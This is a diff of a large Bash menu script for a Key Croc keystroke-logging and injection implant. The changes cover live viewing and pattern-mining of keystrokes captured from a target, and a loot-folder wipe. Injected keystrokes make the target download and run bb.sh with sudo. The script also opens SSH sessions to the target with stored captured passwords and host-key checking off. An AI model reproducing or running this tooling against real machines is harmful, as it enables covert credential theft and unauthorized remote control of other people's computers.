-							Q ENTER ; sleep 2 ; Q STRING "$(sed -n 1p /tmp/CPW.txt)" ; Q ENTER ; sleep 2 ; Q STRING "RELOAD_PAYLOADS; exit" ; Q ENTER ; sleep 1 ; Q STRING "exit" ; Q ENTER ; sleep 1 ; Q GUI d ;;
-					esac
-					printf '\033[H\033[2J'
-					ColorYellow '\n\t\tkeystrokes will display here\n'
-					WAIT_FOR_KEYBOARD_ACTIVITY 1
-					tail -f /tmp/livekey.txt
-				fi ;;
-			[mM])
-				sshpass -p "$(sed -n 1p /tmp/CPW.txt)" ssh -o "StrictHostKeyChecking no" root@localhost
-				read_all 'START LIVE KEYSTROKE Y/N AND PRESS [ENTER]'
-				case "$r_a" in
-					[yY] | [yY][eE][sS])
-						printf '\033[H\033[2J'
-						ColorYellow '\n\t\tkeystrokes will display here\n'
-						WAIT_FOR_KEYBOARD_ACTIVITY 1
-						tail -f /tmp/livekey.txt ;;
-					[nN] | [nN][oO])
-						ColorYellow 'Maybe next time\n' ;;
-					*)
-						invalid_entry ;;
-				esac ;;
-			[eE])
-				ColorYellow 'Unplug keycroc and plug back in\n' ; exit ;;
-			*)
-				invalid_entry ;;
-			esac ;;
+			trap 'ColorYellow "\n\nYou have exited the log tail and returned to the main menu." && return' SIGINT
+			ColorYellow "Waiting for keyboard activity"
+			WAIT_FOR_KEYBOARD_ACTIVITY 0
+			printf '\033[H\033[2J'
+			ColorYellow '\n\t\tkeystrokes will display here\n'
+			tail -f loot/croc_char.log
+			trap - SIGINT ;;
 		[nN] | [nN][oO])
 			ColorYellow 'Maybe next time\n' ;;
 		*)
 			invalid_entry ;;
-		esac
-	fi ;;
-[nN] | [nN][oO])
-	ColorYellow 'Maybe next time\n' ;;
-*)
-	invalid_entry ;;
-esac
+	esac
 }
 ##
 #----Check keycroc keystroke log file (loot/croc_char.log) for match word/pattern
@@ -7528,9 +7556,10 @@ word_check() {
 	case "$r_a" in
 		[yY] | [yY][eE][sS])
 			read_all 'ENTER WORD/PATTERN AND PRESS [ENTER]' ; local M_W="$r_a"
-			if [ "$(cat /root/udisk/loot/croc_char.log | sed -n 's/.*\('"$M_W"'\).*/\1/p')" = "$M_W" ]; then
+			find . -type f -name "croc_char.log" -exec cat {} + > /tmp/combined_logs.txt
+			if [ "$(cat /tmp/combined_logs.txt | sed -n 's/.*\('"$M_W"'\).*/\1/p')" = "$M_W" ]; then
 				ColorYellow 'Found match word/pattern in loot/croc_char.log\n'
-				ColorGreen "$M_W$(ColorYellow ' count: ')$(ColorGreen "$(grep -o "$M_W" /root/udisk/loot/croc_char.log | wc -w)")\n"
+				ColorGreen "$M_W$(ColorYellow ' count: ')$(ColorGreen "$(grep -o "$M_W" /tmp/combined_logs.txt | wc -w)")\n"
 			else
 				ColorYellow 'Did not find match word/pattern in loot/croc_char.log\n'
 				ColorRed "$M_W\n"
@@ -7560,10 +7589,11 @@ with word list'
 				invalid_entry ; ColorRed 'Did not find Word list please try again\n'
 			fi
 			reset_broken
+			find . -type f -name "croc_char.log" -exec cat {} + > /tmp/combined_logs.txt
 			while [ "$broken" -eq 1 ] && break || IFS= read -r; do
-				if [ "$REPLY" = "$(sed -n 's/.*\('"$REPLY"'\).*/\1/p' /root/udisk/loot/croc_char.log)" ]; then
+				if [ "$REPLY" = "$(sed -n 's/.*\('"$REPLY"'\).*/\1/p' /tmp/combined_logs.txt)" ]; then
 					ColorYellow 'Found match word/pattern in loot/croc_char.log\n'
-					ColorGreen "$REPLY$(ColorYellow ' count: ')$(ColorGreen "$(grep -o $REPLY /root/udisk/loot/croc_char.log | wc -w)")\n"
+					ColorGreen "$REPLY$(ColorYellow ' count: ')$(ColorGreen "$(grep -o $REPLY /tmp/combined_logs.txt | wc -w)")\n"
 				else
 					ColorYellow 'Did not find match word/pattern in loot/croc_char.log\n'
 					ColorRed "$REPLY\n"
@@ -7579,25 +7609,72 @@ with word list'
 #----View keycroc loot/croc_char.log file
 ##
 view_key() {
-	Info_Screen '-View Keycroc keystroke log file at loot/croc_char.log
--View croc_char.log filter out ENTER BACKSPACE..ect
--View loot/croc_raw.log and loot/matches.log
--This will enter ARMING_MODE to sync loot/croc_char.log'
-	read_all 'VIEW LOOT/CROC CHAR.LOG Y/N AND PRESS [ENTER]'
+	Info_Screen '-View Key croc keystroke log file
+[C]- croc_char.log
+[R]- croc_raw.log
+[M]- matches.log
+[Q]- QUACK.log
+[H]- hotplug.log
+[A]- attackmode.log
+[F]- Filtered croc_char.log
+[N]- Match pattern count'
+ 
+	read_all 'VIEW LOG FILES Y/N AND PRESS [ENTER]'
 	case "$r_a" in
 		[yY] | [yY][eE][sS])
-			ARMING_MODE
-			sleep 5
-			ATTACKMODE HID
-			sleep 5
-			ColorYellow "Keycroc full Keystroke log file at loot/croc_char.log count: $(ColorGreen "$(cat /root/udisk/loot/croc_char.log | wc -m)")\n"
-			cat /root/udisk/loot/croc_char.log
-			ColorYellow "Keycroc edited Keystroke log file at loot/croc_char.log count: $(ColorGreen "$(cat /root/udisk/loot/croc_char.log | wc -m)")\n"
-			cat /root/udisk/loot/croc_char.log | sed 's/\[ENTER]/\n/g' | sed 's/\[[^]]*\]//g' | sed '/^[[:space:]]*$/d' | tr -s ' '
-			ColorYellow "Keycroc loot/croc_raw.log count: $(ColorGreen "$(cat /root/udisk/loot/croc_raw.log | wc -m)")\n"
-			cat /root/udisk/loot/croc_raw.log
-			ColorYellow "Keycroc /root/loot/matches.log count: $(ColorGreen "$(cat /root/udisk/loot/matches.log | wc -m)")\n"
-			cat /root/udisk/loot/matches.log ;;
+			read_all '[C]-char [R]-raw [M]-matches [Q]-QUACK [H]-hotplug [A]-attackmode\n [F]- Filtered croc-char [N]- Match pattern'
+			process_logs() {
+				local log_name="$1"
+				find . -type f -name "$log_name" -print0 | while IFS= read -r -d '' file; do
+					ColorYellow "File: $(ColorCyan "$file")\n"
+					ColorYellow "$log_name: $(ColorCyan "$(cat $file | wc -m)")\n"
+					ColorGreen "$(cat $file)"
+					ColorRed "\n$LINE\n"
+					sleep .5
+				done
+			}
+			case "$r_a" in
+				[cC])
+					process_logs "croc_char.log" ;;
+				[rR])
+					process_logs "croc_raw.log" ;;
+				[mM])
+					process_logs "matches.log" ;;
+				[qQ])
+					process_logs "QUACK.log" ;;
+				[hH])
+					process_logs "hotplug.log" ;;
+				[aA])
+					process_logs "attackmode.log" ;;
+				[fF])
+					find . -type f -name "croc_char.log" -print0 | while IFS= read -r -d '' file; do
+						ColorYellow "File: $(ColorCyan "$file")\n"
+						log_char_count=$(sed 's/\[[^]]*\]//g' "$file" | wc -m)
+						ColorYellow "Character Count: $(ColorCyan "$log_char_count")\n"
+						ColorGreen "$(sed 's/\[[^]]*\]//g' "$file")"
+						ColorRed "\n$LINE\n"
+						sleep .5
+					done ;;
+				[nN])
+					content=$(find . -type f -name "croc_char.log" -exec cat {} +)
+					patterns=$(echo "$content" | grep -oE '(\w+|\[[^]]*\]|\([^)]*\)|\{[^}]*\}|[][(){}<>?@#\$%^&*\-=+\\|/.,:;"'\''!]+)' | awk '{count[$1]++} END {for(pattern in count) print count[pattern], pattern}' | sort -nr)
+					ColorYellow "Patterns sorted by frequency:\n"
+					echo "$patterns"
+					ColorYellow "$LINE"
+					find . -type f -name "croc_char.log" -exec sed 's/\[[^]]*\]//g' {} + | \
+					awk 'length($0) >= 3 { 
+						for(i=1; i<=length($0)-2; i++) { 
+							for(j=i+2; j<=length($0) && j-i+1<=16; j++) { 
+								print substr($0, i, j-i+1)
+								}
+							}
+						}' | \
+					sort | uniq -c | \
+					awk '$1 > 1 {print $1, $2}' | \
+					sort -nr ;;
+				*)
+					invalid_entry ;;
+			esac ;;
 		[nN] | [nN][oO])
 			ColorYellow 'Maybe next time\n' ;;
 		*)
@@ -7605,17 +7682,140 @@ view_key() {
 	esac
 }
 ##
-#----Clean keycroc keystroke loot/croc_char.log, loot/croc_raw.log, loot/matches.log
+#----Function to handle back up the "/root/udisk/loot" directory to "/tmp/loot_backup" and clean it
 ##
 clean_log() {
-	Info_Screen '-Clean keycroc keystroke loot/croc_char.log, loot/croc_raw.log, loot/matches.log'
-	read_all 'CLEAN KEYCROC KEYSTROKE FILES Y/N AND PRESS [ENTER]'
+	Info_Screen 'Back up the /root/udisk/loot directory 
+to /tmp/loot_backup and clean it.
+NOTE: This will remove all folders in loot folder.'
+	cd /root/udisk/loot && ls -la
+	read_all 'BACKUP & CLEAN KEYCROC LOOT DIRECTORY Y/N AND PRESS [ENTER]'
 	case "$r_a" in
 		[yY] | [yY][eE][sS])
-			echo > /root/udisk/loot/croc_char.log
-			echo > /root/udisk/loot/croc_raw.log
-			echo > /root/udisk/loot/matches.log
-			ColorYellow 'Keycroc keystroke log files have been cleaned\n/loot/croc_char.log\n/loot/croc_raw.log\n/loot/matches.log\n' ;;
+			# Check if the source directory exists
+			if [ ! -d "$source_dir" ]; then
+				ColorRed "Error: Source directory $source_dir does not exist.\n"
+				return
+			fi
+			# Create the backup directory if it does not exist
+			if [ ! -d "$backup_dir" ]; then
+				ColorYellow "Creating backup directory $backup_dir...\n"
+				mkdir -p "$backup_dir"
+			fi
+			# Copy the entire contents of the "/root/udisk/loot" directory to the backup directory
+			ColorYellow "Backing up $source_dir to $backup_dir...\n"
+			cp -r "$source_dir"/* "$backup_dir"
+			# Check if the copy was successful
+			if [ $? -eq 0 ]; then
+				ColorGreen "Backup successful!\n"
+				# Clean (delete) all files and subdirectories inside "/root/udisk/loot"
+				ColorYellow "Cleaning up the $source_dir directory...\n"
+				rm -rf "$source_dir"/*
+				# Check if the clean-up was successful
+				if [ $? -eq 0 ]; then
+					ColorGreen "Clean-up successful! All files in $source_dir have been deleted.\n"
+				else
+					ColorRed "Failed to clean the $source_dir directory.\n"
+				fi
+			else
+				ColorRed "Backup failed. No files were copied.\n"
+			fi ;;
+		[nN] | [nN][oO])
+			ColorYellow "Maybe next time\n" ;;
+		*)
+			invalid_entry ;;
+	esac
+}
+##
+#----Converts an input string containing alphanumeric characters to binary, hex, key-code, Unicode, octal, URL encoded, Base64 encoded
+##
+Convert_input() {
+	Info_Screen 'The code reads a single character at a time from user input.
+For each character:
+  It calculates the ASCII value.
+  Converts the ASCII value to binary, hex, key code, Unicode, octal,
+  URL-encoded, and Base64 representations.
+
+The code outputs the calculated representations for each character.
+PRESS CTRL + C to break loop in terminal.'
+	read_all 'START CONVERT INPUT Y/N AND PRESS [ENTER]'
+	case "$r_a" in
+		[yY] | [yY][eE][sS])
+			reset_broken
+			while [ "$broken" -eq 1 ] && break || read -r -n 1 input_string; do
+				binary=""
+				hex=""
+				key_code=""
+				unicode=""
+				octal=""
+				url_encoded=""
+				base64_encoded=""
+				if [[ $input_string == $'\e' ]]; then
+					key_combination=""
+					read -rsn 2 input_string
+					key_combination+="$input_string"
+				else
+					for (( i=0; i<${#input_string}; i++ )); do
+						char=${input_string:i:1}
+						ascii=$(printf "%d" "'$char")
+						for (( j=7; j>=0; j-- )); do
+							bit=$(( (ascii >> j) & 1 ))
+							binary+="$bit"
+						done
+						binary+=" "
+						hex+="$(printf "%02x" "$ascii") "
+						key_code+="$(printf "%d" "'$char") "
+						unicode+="\u$(printf "%04x" "$ascii") "
+						octal+="\\$(printf "%03o" "$ascii") "
+						url_encoded+="$(printf "%%%02x" "$ascii")"
+						base64_encoded+=$(printf "%s" "$char" | base64)
+					done
+				fi
+				echo -ne " ${yellow}Binary:${cyan}$binary${yellow}Hex:${cyan}$hex${yellow}Key-code:${cyan}$key_code${yellow}Unicode:$clear" ; echo -n "$unicode" ; echo -ne "${yellow}Octal:${cyan}$octal${yellow}URL:${cyan}$url_encoded${yellow} Base64:${cyan}$base64_encoded$clear\n"
+			done ;;
+		[nN] | [nN][oO])
+			ColorYellow 'Maybe next time\n' ;;
+		*)
+			invalid_entry ;;
+	esac
+}
+##
+#----QUACK TEST, test keycroc keystroke injection
+##
+quack_test() {
+	Info_Screen 'Test keycroc keystroke injection
+QUACK TEST:
+abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-10-8-7-6-5-4-3-2-1!@#$%^&
+
+Window run in notepad
+Linux run in terminal'
+	TEST_QUACK() {
+		for test_quack in {a..z} {A..Z} {-10..-1} '!' '@' '#' '$' '%' '^' '&' '*' '(' ')' '_' '+' '=' '[' ']' '\\' ';' ':' '\"' '<' ',' '>' '.' '?' '\/'; do
+			QUACK STRING "$test_quack"
+			ColorYellow "$test_quack"
+		done
+		ColorGreen 'Test is complete\n' ; sleep 5
+	}
+	read_all 'START QUACK TEST Y/N AND PRESS [ENTER]'
+	case "$r_a" in
+		[yY] | [yY][eE][sS])
+			if [ "$(OS_CHECK)" = WINDOWS ]; then
+				QUACK GUI m ; QUACK GUI r ; QUACK DELAY 2000 ; QUACK STRING "notepad" ; QUACK ENTER ; QUACK DELAY 5000
+				TEST_QUACK && QUACK CONTROL-a ; QUACK BACKSPACE ; QUACK ALT-F4
+			elif [ "$(OS_CHECK)" = LINUX ]; then
+				case "$HOST_CHECK" in
+					raspberrypi)
+						QUACK CONTROL-ALT-d ; QUACK CONTROL-ALT-t ; QUACK DELAY 2000
+						TEST_QUACK && QUACK ENTER ; QUACK STRING "exit" ; QUACK ENTER ;;
+					"$HOST_CHECK")
+						QUACK CONTROL-ALT-d ; QUACK ALT-t ; QUACK DELAY 2000
+						TEST_QUACK && QUACK ENTER ; QUACK STRING "exit" ; QUACK ENTER ;;
+					*)
+						TEST_QUACK && QUACK ENTER ; QUACK STRING "exit" ; QUACK ENTER ;;
+				esac
+			else
+				TEST_QUACK && QUACK ENTER ; QUACK STRING "exit" ; QUACK ENTER
+			fi ;;
 		[nN] | [nN][oO])
 			ColorYellow 'Maybe next time\n' ;;
 		*)
@@ -7629,18 +7829,23 @@ clean_log() {
 	MenuColor 21 1 'VIEW LIVE KEYSTROKES'
 	MenuColor 21 2 'MATCH WORD SCAN'
 	MenuColor 21 3 'MATCH WORD LIST SCAN'
-	MenuColor 21 4 'VIEW CROC CHAR.LOG'
-	MenuColor 21 5 'CLEAN CHAR.LOG FILES'
-	MenuColor 21 6 'RETURN TO MAIN MENU'
+	MenuColor 21 4 'PREVIOUS KEYSTROKES'
+	MenuColor 21 5 'CLEAN LOOT FOLDER'
+	MenuColor 21 6 'CONVERT INPUT'
+	MenuColor 21 7 'QUACK TEST'
+	MenuColor 21 8 'RETURN TO MAIN MENU'
 	MenuEnd 20
 	case "$m_a" in
-		1) keystrokes_V ; key_file ;;
+		1) keystrokes_V ; trap - SIGINT ; key_file ;;
 		2) word_check ; key_file ;;
 		3) list_check ; key_file ;;
 		4) view_key ; key_file ;;
 		5) clean_log ; key_file ;;
-		6) main_menu ;;
+		6) Convert_input ; key_file ;;
+		7) quack_test ; key_file ;;
+		8) main_menu ;;
 		0) exit ;;
+		lock) Lock_keyboard ; key_file ;;
 		[pP]) Panic_button ;; [bB]) menu_A ;; *) invalid_entry ; key_file ;;
 	esac
 }
@@ -7700,7 +7905,7 @@ list_match() {
 #----Status check local weather
 ##
 check_weather() {
-	Info_Screen '-Check check local weather
+	Info_Screen '-Check local weather
 -Author: Igor chubin https://github.com/chubin/wttr.in'
 	curl wttr.in ; sleep 5
 	curl v2.wttr.in/ ; sleep 5
@@ -7713,15 +7918,15 @@ top_croc() {
 	Info_Screen '-top An Information-Packed Dashboard
 -Press Q to exit top.
 
-The third line displays the following central processing unit (CPU) values:
+The third line displays the following central processing unit [CPU] values:
 -us: Amount of time the CPU spends executing processes for people in user space
--sy: Amount of time spent running system kernel space processes.
--ni: Amount of time spent executing processes with a manually set nice value.
+-sy: Amount of time spent running system [ kernel space ] processes
+-ni: Amount of time spent executing processes with a manually set nice value
 -id: Amount of CPU idle time.
 -wa: Amount of time the CPU spends waiting for I/O to complete.
 -hi: Amount of time spent servicing hardware interrupts.
 -si: Amount of time spent servicing software interrupts.
--st: Amount of time lost due to running virtual machines (steal time).
+-st: Amount of time lost due to running virtual machines [ steal time ].
 
 The column headings in the process list are as follows:
 -PID: Process ID.
@@ -7730,34 +7935,35 @@ The column headings in the process list are as follows:
 -VIRT: Amount of virtual memory used by the process.
 -RES: Amount of resident memory used by the process.
 -SHR: Amount of shared memory used by the process.
--S: Status of the process. (See the list below for the values field can take).
+-S: Status of the process. [See the list below for the values field can take].
 -%CPU: The share of CPU time used by the process since the last update.
 -%MEM: The share of physical memory used.
 -TIME+: Total CPU time used by the task in hundredths of a second.
--COMMAND: The command name or command line (name + options).
+
+-COMMAND: The command name or command line [ name + options ].
 The status of the process can be one of the following:
 -D: Uninterruptible sleep
--R: Running -S: Sleeping
--T: Traced (stopped)
+-R: Running
+-S: Sleeping
+-T: Traced [ stopped ]
 -Z: Zombie
 
 Scrolling the Display:
 -You can press the Up or Down Arrows, Home, End, and Page Up or Down keys
 to move up and down and access all the processes.
 Changing the Numeric Units:
--We pressed E to set the dashboard memory units to gibibytes and “e”
+-We pressed E to set the dashboard memory units to gibibytes and [ e ]
 to set the process list memory units to mebibytes.
 
 Changing the Summary Contents:
--Press “l” to toggle the load summary line (the first line) on or off.
--Press “t” to swap the CPU displays show the percentage of usage for each CPU
--Press “m” to cycle the memory and swap memory lines.
--Press “1” to change the display and see individual statistics for each CPU.
-
+-Press [ l ] to toggle the load summary line [the first line] on or off.
+-Press [ t ] to swap the CPU displays show the percentage of usage for each CPU
+-Press [ m ] to cycle the memory and swap memory lines.
+-Press [ 1 ] to change the display and see individual statistics for each CPU.
 Color and Highlighting:
--Press “z” to add color to the display.
--Press “y” to highlight running tasks in the process list.
--Press “x” highlights the column used to sort the process list.
+-Press [ z ] to add color to the display.
+-Press [ y ] to highlight running tasks in the process list.
+-Press [ x ] highlights the column used to sort the process list.
 
 Sorting by Columns sort column by pressing the following:
 -P: The %CPU column.
@@ -7766,27 +7972,22 @@ Sorting by Columns sort column by pressing the following:
 -T: The TIME+ column.
 
 See the Full Command Line:
--Press “c” toggles the COMMAND column between displaying the process name.
--Press “V” To see a tree of processes that were launched.
-
+-Press [ c ] toggles the COMMAND column between displaying the process name.
+-Press [ V ] To see a tree of processes that were launched.
 See Processes for a Single User:
--Press “u” to see processes for a single user. Be prompted for the name or UID
-
+-Press [ u ] to see processes for a single user. Prompted for the name or UID.
 Only See Active Tasks:
--Press “l” to see only active tasks.
-
+-Press [ l ]to see only active tasks.
 Set How Many Processes to Display:
--Press “n” to limit the display to a certain number of lines.
-
+-Press [ n ]to limit the display to a certain number of lines.
 Renice a Process:
--Press “r” to change the nice value (priority) for a process.
-
+-Press [ r ] to change the nice value [priority] for a process.
 Kill a Process:
--Press “k” to kill a process. Be prompted for the process ID you want to kill.
+-Press [ k ] to kill a process. Be prompted for the process ID you want to kill
 
 Alternative Display Mode:
 -Works best in full-screen mode. Press A display four areas in the process list
-and then press “a” to move from area to area.
+and then press [ a ] to move from area to area.
 
 Other Keystrokes:
 -W: Save your settings and customizations.
@@ -7880,7 +8081,7 @@ menu_A() {
 	MenuColor 27 4 'KERNEL VERSION'
 	MenuColor 27 5 'RUNNING PROCESSES'
 	MenuColor 27 6 'CHECK ALL'
-	MenuColor 27 7 'TARGET PC INFO'
+	MenuColor 27 7 'TARGET INFO'
 	MenuColor 27 8 'VIEW/LIVE KEYSTROKES'
 	MenuColor 27 9 'START NMON MONITORING'
 	MenuColor 26 10 'LIST MATCH PAYLOADS WORDS'
@@ -7907,6 +8108,7 @@ menu_A() {
 		14) iptraf_ng ; menu_A ;;
 		15) main_menu ;;
 		0) exit ;;
+		lock) Lock_keyboard ; menu_A ;;
 		[pP]) Panic_button ;; [bB]) main_menu ;; *) invalid_entry ; menu_A ;;
 	esac
 }
@@ -8049,7 +8251,7 @@ mc_remove() {
 	esac
 }
 ##
-#----Edit menu- Midnight Menu
+#----Midnight Menu
 ##
 	MenuTitle 'MIDNIGHT COMMANDER MENU'
 	MenuColor 26 1 'INSTALL MIDNIGHT COMMANDER'
@@ -8063,11 +8265,12 @@ mc_remove() {
 		3) mc ; midnight_manager ;;
 		4) main_menu ;;
 		0) exit ;;
+		lock) Lock_keyboard ; midnight_manager ;;
 		[pP]) Panic_button ;; [bB]) croc_edit_menu ;; *) invalid_entry ; midnight_manager ;;
 	esac
 }
 ##
-#----Edit menu- Display Edit Menu
+#----Edit menu
 ##
 	MenuTitle 'CROC EDIT MENU'
 	MenuColor 22 1 'CROC PAYLOADS FOLDER' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 22 8 'ATTACKMODE HID' | sed 's/\t//g'
@@ -8096,6 +8299,7 @@ mc_remove() {
 		14) midnight_manager ;;
 		15) main_menu ; tput civis ;;
 		0) exit ;;
+		lock) Lock_keyboard ; croc_edit_menu ;;
 		[pP]) Panic_button ;; [bB]) main_menu ; tput civis ;; *) invalid_entry ; croc_edit_menu ;;
 	esac
 }
@@ -8107,6 +8311,7 @@ function ssh_menu() {
 #----SSH menu Install sshpass/check active SSH connection
 ##
 	install_package sshpass SSHPASS
+	systemctl status sshd.service
 #
 #----Check and start ssh to hak5 device
 #
@@ -8178,9 +8383,9 @@ turtle_check() {
 #----SSH check port 22 open or closed
 ##
 port_check() {
-	nc -z -v -w 1 "$1" 22 &>/dev/null 2>&1
+	nc -vz -v -w 1 "$1" 22 &>/dev/null 2>&1
 	if [[ $? -ne 0 ]]; then
-		nc -z -v -w 1 "$DEFAULT_IP" 22 &>/dev/null 2>&1
+		nc -vz -v -w 1 "$DEFAULT_IP" 22 &>/dev/null 2>&1
 		if [[ $? -ne 0 ]]; then
 			ColorYellow " PORT:$(ColorRed '22 CLOSED')\n"
 			unset DEFAULT_IP
@@ -8236,7 +8441,7 @@ bunny_mac() {
 	fi 2>/dev/null
 	if [[ "$(sed -n 1p /root/udisk/tools/Croc_Pot/bunny_mac.txt)" =~ ^([[:xdigit:]][[:xdigit:]]:){5}[[:xdigit:]][[:xdigit:]]$ ]]; then
 		local bunny_s=$(sed -n 30p /root/udisk/tools/Croc_Pot/Bunny_Payload_Shell/payload.txt | sed -e 's/ssh -fN -R \(.*\):localhost:22/\1/' | awk '{print $5}')
-		echo -ne "\e[38;5;19;4;1;48;5;245mBASH BUNNY$clear${yellow}:$clear${green}TUNNEL${clear} ${yellow}IP:$clear${green}172.16.64.1$clear${yellow} MAC:$clear$green${bunny_v}$clear${yellow} Port:$clear$green${bunny_s}$clear\n"
+		echo -ne "\e[38;5;19;4;1;48;5;245mBASH BUNNY$clear${yellow}:$clear${green}TUNNEL ${clear}${yellow}IP:$clear${green}172.16.64.1$clear${yellow} MAC:$clear$green${bunny_v}$clear${yellow} PORT:$clear$green${bunny_s}$clear\n"
 	else
 		:
 	fi 2>/dev/null
@@ -8284,7 +8489,7 @@ owl_check() {
 ##
 #----SSH display info screen
 ##
-	Info_Screen '-SSH into HAK5 gear and TARGET PC
+	Info_Screen '-SSH into HAK5 gear and TARGET
 -Reverse ssh tunnel, Create SSH Public/Private Key
 -Ensure devices are connected to the same local network As keycroc'
 user_agent_random
@@ -8293,7 +8498,7 @@ local croc_city=$(curl -Lsf -A "$userAgent" --connect-timeout 2 --max-time 2 htt
 local croc_country=$(curl -Lsf -A "$userAgent" --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=country)
 local croc_region=$(curl -Lsf -A "$userAgent" --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=region)
 local croc_isp=$(curl -Lsf -A "$userAgent" --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=isp | awk '{print $1}')
-check_device "$(os_ip)" TARGET PC
+check_device "$(os_ip)" TARGET
 echo -ne "\e[38;5;19;4;1;48;5;245mPUBLIC IP$clear${yellow}:$clear$green$(curl -s -A "$userAgent" --connect-timeout 2 --max-time 2 https://checkip.amazonaws.com) $clear${yellow}COUNTRY:$clear$green${croc_country^^} $clear${yellow}CITY:$clear$green${croc_city^^}$clear${yellow}/$clear$green${croc_region} $clear${yellow}ISP:$clear$green${croc_isp^^}$clear\n"
 ssid_check ; check_device croc KEY CROC_ | sed 's/--/'"$croc_mac"'/g'
 default_ip 172.16.42.1 ; check_device mk7 WIFI PINEAPPLE7 
@@ -8306,15 +8511,15 @@ echo -ne "\e[48;5;202;30m$LINE$clear\n"
 ColorYellow "$(awk -v m=80 '{printf("%-80s\n", $0)}' <<< 'Active SSH connection:')
 $(ColorGreen "$(ss | grep -i ssh)\n$(last -a | grep -i still)")\n"
 ##
-#----SSH keycroc to target pc
+#----SSH keycroc to target
 ##
 pc_ssh() {
 	ColorYellow "Found save Passwd try this: $(ColorGreen "$(target_pw)")\n"
 	if [ -e "/root/udisk/tools/Croc_Pot/Croc_OS_Target.txt" ]; then
 		start_ssh() {
-			ColorYellow "Target PC user name: $(ColorGreen "$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)")\n"
-			ColorYellow "Target PC IP: $(ColorGreen "$(os_ip)")\n"
-			ColorGreen 'Starting SSH with Target PC\n'
+			ColorYellow "Target user name: $(ColorGreen "$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)")\n"
+			ColorYellow "Target IP: $(ColorGreen "$(os_ip)")\n"
+			ColorGreen "Starting SSH with Target$clear\n"
 			if [ -e "/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered" ]; then
 				sshpass -p "$(target_pw)" ssh -o "StrictHostKeyChecking no" "$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)"@"$(os_ip)"
 			else
@@ -8359,6 +8564,7 @@ ssh_pineapple() {
 	ping -q -c 1 -w 1 mk7 &>/dev/null 2>&1
 if [[ $? -ne 0 ]]; then
 	ColorRed '\nDid not detect Wi-Fi Pineapple Mk7\n'
+	ssh_menu
 elif [[ "${#args[@]}" -eq 0 ]]; then
 ##
 #----SSH Wi-Fi Pineapple Mk7 kismet LED lights random/off/reset/custom
@@ -8416,6 +8622,7 @@ kismet_custom() {
 		4) kismet_custom ; pineapple_led ;;
 		5) main_menu ;;
 		0) exit ;;
+		lock) Lock_keyboard ; pineapple_led ;;
 		[pP]) Panic_button ;; [bB]) ssh_pineapple ;; *) invalid_entry ; pineapple_led ;;
 	esac
 }
@@ -8443,6 +8650,7 @@ kismet_custom() {
 		ssh root@mk7 "$USER_COMMAND" ; sleep 5 ; ssh_pineapple ;;
 		7) main_menu ;;
 		0) exit ;;
+		lock) Lock_keyboard ; ssh_pineapple ;;
 		[bB]) ssh_menu ;; [pP]) Panic_button ;; *) invalid_entry ; ssh_pineapple ;;
 	esac
 fi
@@ -8489,40 +8697,40 @@ ssh_shark() {
 #----SSH to bash bunny
 ##
 ssh_bunny() {
-	Info_Screen '-Start ssh with Target PC to Bash bunny or
+	Info_Screen '-Start ssh with Target to Bash bunny or
 -Start REVERSE SSH Tunnel with keycroc to bash bunny
 -Will need to install a small payload onto bash bunny
 -This will create the payload for the bash bunny and save it to tools folder
 -Place this in one of the bunny payloads switchs folder this is needed for
 reverse ssh tunnel From bunny to keycroc
--Ensure bash bunny is connected to target pc
+-Ensure bash bunny is connected to target
 -Ensure bash bunny has internet connection
 -Recommend to setup public and private keys on both bunny & Croc'
 	local bunny_payload=/root/udisk/tools/Croc_Pot/Bunny_Payload_Shell
 	local bunny_payload_v=/root/udisk/tools/Croc_Pot/Bunny_Payload_Shell/payload.txt
 ##
-#----Connect bunny to target pc network linux only
+#----Connect bunny to target network linux only
 ##
 if [ "$(OS_CHECK)" = LINUX ]; then
-	read_all 'CONNECT BUNNY TO TARGET PC NETWORK Y/N AND PRESS [ENTER]'
+	read_all 'CONNECT BUNNY TO TARGET NETWORK Y/N AND PRESS [ENTER]'
 	case "$r_a" in
 	[yY] | [yY][eE][sS])
 		case "$HOST_CHECK" in
 		raspberrypi)
-			Q CONTROL-ALT-t ; sleep 1 ; Q STRING "i=\$(whoami)" ; Q ENTER ; Q STRING "if [ -e /home/\${i}/bb.sh ]; then"
-			Q ENTER ; Q STRING "echo \"bb.sh is installed\"" ; Q ENTER ; Q STRING "else" ; Q ENTER ; Q STRING "echo \"installing bb.sh\"" ; Q ENTER
-			Q STRING "wget bashbunny.com/bb.sh" ; Q ENTER ; Q STRING "fi" ; Q ENTER ; sleep 2 ; Q STRING "sudo bash ./bb.sh" ; Q ENTER ; sleep 3
-			Q STRING "c" ; sleep 2 ; Q STRING "exit" ; Q ENTER ; Q ALT-TAB ;;
+			QUACK CONTROL-ALT-t ; sleep 1 ; QUACK STRING "i=\$(whoami)" ; QUACK ENTER ; QUACK STRING "if [ -e /home/\${i}/bb.sh ]; then"
+			QUACK ENTER ; QUACK STRING "echo \"bb.sh is installed\"" ; QUACK ENTER ; QUACK STRING "else" ; QUACK ENTER ; QUACK STRING "echo \"installing bb.sh\"" ; QUACK ENTER
+			QUACK STRING "wget bashbunny.com/bb.sh" ; QUACK ENTER ; QUACK STRING "fi" ; QUACK ENTER ; sleep 2 ; QUACK STRING "sudo bash ./bb.sh" ; QUACK ENTER ; sleep 3
+			QUACK STRING "c" ; sleep 2 ; QUACK STRING "exit" ; QUACK ENTER ; QUACK ALT-TAB ;;
 		"$HOST_CHECK")
-			Q ALT F2 ; sleep 1 ; Q STRING "mate-terminal" ; Q ENTER ; sleep 1 ; Q STRING "i=\$(whoami)" ; Q ENTER ; Q STRING "if [ -e /home/\${i}/bb.sh ]; then"
-			Q ENTER ; Q STRING "echo \"bb.sh is installed\"" ; Q ENTER ; Q STRING "else" ; Q ENTER ; Q STRING "echo \"installing bb.sh\"" ; Q ENTER
-			Q STRING "wget bashbunny.com/bb.sh" ; Q ENTER ; Q STRING "fi" ; Q ENTER ; sleep 2 ; Q STRING "sudo bash ./bb.sh" ; Q ENTER ; sleep 3
